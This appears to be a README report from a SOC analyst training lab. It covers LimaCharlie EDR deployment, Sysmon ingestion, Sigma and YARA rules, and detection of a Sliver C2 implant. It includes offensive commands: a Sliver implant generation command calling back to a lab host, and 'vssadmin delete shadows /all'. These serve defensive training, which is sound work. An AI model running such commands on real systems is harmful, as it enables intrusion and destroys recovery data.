# # LimaCharlie SOC Analyst Lab: Hands‑On EDR, C2 Simulation and Detection

## Scenario Overview

As a SOC analyst‑in‑training, I built a lab environment that mirrors the tasks undertaken by professionals using the LimaCharlie SecOps Cloud Platform. The exercises documented here include deploying an EDR sensor, ingesting Sysmon logs, enabling Sigma rules, interacting with a Sliver command‑and‑control (C2) framework, and creating detection and blocking rules. By completing each step manually, I gained hands‑on experience with endpoint telemetry, attack simulation, and automated response.

## Lab Environment

* **Windows VM** – A lab workstation where the LimaCharlie agent and Sliver implant were installed.
* **Linux VM** – Hosts the Sliver server and client used to generate and manage C2 implants.
* **LimaCharlie Console** – Cloud interface for managing sensors, logs, rules, and detections.

### Tools Used

* LimaCharlie EDR agent and web console
* Windows Sysmon event logging
* Sigma rule set extension
* Sliver C2 framework (server and client)
* YARA rules for malware detection

## Objectives

This lab aligns with SOC analyst skills such as:

* Deploying endpoint sensors and ingesting event logs.
* Detecting malicious activity using Sigma and YARA rules.
* Simulating attacker behavior with a C2 implant.
* Crafting and testing detection & response (D&R) rules to block threats.

## Steps Overview

### 1. Deploy LimaCharlie and Create an Organization

* Created a free LimaCharlie account and completed the role questionnaire.
* Created a unique organization, selected the nearest data residency region, disabled the demo configuration, and chose no pre‑configured template.
* Added a Windows endpoint sensor (x86‑64 installer) but did not install it yet.
* Started both the Windows and Linux virtual machines to prepare for agent installation and Sliver setup.

### 2. Install the EDR Agent on Windows

* On the Windows VM, opened an administrative command prompt and navigated to `C:\Users\Administrator\Downloads`.
* Executed the installer using the command:

  ```powershell
  .\lc_sensor.exe -i <my_installation_key>
  ```

* Confirmed in the LimaCharlie console that the sensor was reporting in.

### 3. Configure Sysmon Log Ingestion

* In **Sensors → Artifact Collection**, created a rule named `windows-sysmon-logs` with pattern `wel://Microsoft-Windows-Sysmon/Operational:*` and a 10‑day retention period.
* Observed Sysmon events arriving alongside LimaCharlie telemetry.

### 4. Enable the Sigma EDR Ruleset

* Navigated to **Add‑ons → Extensions** and subscribed to the `ext‑sigma` extension.
* This loaded a comprehensive library of Sigma detection rules into the environment.

### 5. Set Up the Sliver C2 Framework

* On the Linux VM, verified that the Sliver server was running via `systemctl status sliver` and started it if necessary.
* Launched the Sliver client and ensured an HTTP listener was active (`jobs`, then `http` if not).
* Generated a unique Sliver implant using:

  ```shell
  generate --http <linux_vm_ip> --save /var/www/payloads
  ```

* On the Windows VM, downloaded the implant from the Sliver server’s web interface and executed it.
* In the Sliver client, confirmed the callback with `sessions` and entered the session (`use <session_id>`).

### 6. Explore the C2 Session and LimaCharlie Telemetry

* Within the Sliver session, ran commands such as `info`, `whoami`, `pwd`, `netstat`, and `ps -T` to enumerate system details, privileges, network connections, and running processes.
* In the LimaCharlie console, navigated through the **Processes**, **Network**, **File System**, and **Timeline** tabs for the Windows sensor.
* Noted that the custom implant appeared as an unsigned process with network activity.
* Used VirusTotal lookups on the implant file and reviewed the Timeline to correlate implant creation, execution, and network activity.

### 7. Detect and Block Volume Shadow Copy Deletion

* In the Sliver session, dropped into a native Windows shell and executed:

  ```powershell
  vssadmin delete shadows /all
  ```

* Observed a Sigma detection in LimaCharlie for shadow copy deletion.
* Built a custom D&R rule that reports detections and issues a `deny_tree` task against the parent process to terminate ransomware‑like activity.
* After enabling the rule, re‑ran the command; the command still completed, but the C2 session was terminated, proving the rule blocked the implant’s process tree.
* Verified the rule fired in the **Detections** tab.

### 8. Add YARA Signatures and Automate Scans

* Added two YARA rules under **Automation → YARA Rules**: `sliver` (for file scanning) and `sliver-process` (for memory scanning) using published Sliver signatures.
* Created two D&R rules to alert on YARA detections: one for file detections and another for process detections.
* On the Windows VM, moved the Sliver implant between directories to trigger automatic scanning of new files. Saw alerts for executable files landing in the **Downloads** folder followed by YARA detections.
* Killed any running implant processes and re-executed the implant from **Downloads**. This generated a new process event and triggered a YARA detection in memory.
* Confirmed that LimaCharlie automatically flagged and tagged the implant both when dropped and when executed.

## Summary and Key Takeaways

By performing each task manually, I gained practical experience in deploying and managing LimaCharlie EDR sensors, ingesting Sysmon logs, enabling Sigma rules, and operating the Sliver C2 framework. I validated that:

* Endpoint telemetry from LimaCharlie and Sysmon provides deep visibility into processes, network connections, and file events.
* Sigma rules and YARA signatures can reliably detect malicious behaviors such as shadow copy deletion and custom implants.
* D&R rules can be tuned to either alert or automatically block threats; proper baselining is crucial to avoid false positives.
* Integrating offensive tooling (Sliver) with defensive platforms (LimaCharlie) offers an end‑to‑end view of attack techniques and defenses.

## Repository Structure

```
lima-charlie-soc-analyst-lab/
├── README.md  # this report documenting my completed labs
```
